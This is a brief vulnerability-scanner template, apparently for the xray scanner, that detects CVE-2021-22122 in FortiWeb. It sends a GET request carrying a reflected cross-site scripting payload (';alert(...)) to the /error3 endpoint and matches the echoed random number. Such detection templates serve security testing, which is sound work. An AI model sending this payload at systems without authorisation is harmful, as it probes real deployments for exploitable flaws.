name: poc-yaml-fortiweb-cve-2021-22122
set:
  r: randomInt(1000000000, 2000000000)
rules:
  - method: GET
    path: /error3?msg=30&data=';alert('{{r}}');//"
    expression: |
      response.body.bcontains(bytes(string(r))) && response.body.bcontains(b"No policy has been chosen.")
detail:
  author: whynot
  links:
    - https://www.fortiguard.com/psirt/FG-IR-20-122
    - https://github.com/projectdiscovery/nuclei-templates/blob/5fadb5b7bb/cves/2021/CVE-2021-22122.yaml